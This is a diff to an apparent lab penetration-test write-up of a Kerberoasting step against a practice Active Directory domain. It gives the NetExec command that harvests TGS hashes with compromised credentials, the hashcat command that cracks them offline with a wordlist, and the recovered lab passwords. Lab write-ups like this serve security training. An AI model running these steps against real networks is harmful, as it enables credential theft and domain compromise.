@@ -49,22 +49,24 @@ Result: SUCCESS. Identified that the account north.sevenkingdoms.local\hodor is 
 📸 Evidence: Successful Password Spray
 <img width="1918" height="276" alt="image" src="https://github.com/user-attachments/assets/0007bea8-11bc-4c05-a71f-82f90b289e71" />
 
-4. Kerberoasting Attack (NetExec)
-Using the valid credentials for brandon.stark, an authenticated LDAP query was performed to request service tickets for accounts with registered Service Principal Names (SPNs).
+4. Kerberoasting (NetExec & Hashcat)
+Following the initial identity harvesting, an authenticated Kerberoasting attack was executed using the compromised brandon.stark credentials to target service accounts with registered Service Principal Names (SPNs).
 
 Command: nxc ldap 192.168.58.11 -u brandon.stark -p 'iseedeadpeople' --kerberoasting KERBEROASTING
 
-Objective: Extract encrypted TGS tickets for offline cracking to compromise service account passwords.
+Objective: Retrieve encrypted Ticket Granting Service (TGS) tickets for offline cracking.
 
-Key Finding: Successfully harvested Kerberos 5 TGS hashes (etype 23) for three high-value accounts:
+Findings: Successfully harvested TGS hashes for high-value targets including jon.snow, sansa.stark, and sql_svc.
 
-jon.snow
+Cracking Result: Utilized Hashcat to perform a dictionary attack against the jon.snow hash.
 
-sansa.stark
+Command:  hashcat -m 13100 --force -a 0 KERBEROASTING /opt/wordlist/rockyou.txt
 
-sql_svc (Critical Target)
+Result: CRACKED — Password recovered: iknownothing
 
 📸 Evidence: Authenticated Kerberoasting Results
 
 <img width="1919" height="937" alt="image" src="https://github.com/user-attachments/assets/a853b2a2-56f0-48a4-beae-31c6ff62450b" />
+
+<img width="1920" height="244" alt="image" src="https://github.com/user-attachments/assets/016f8703-8d61-49e0-909e-a059c785f6fa" />
 
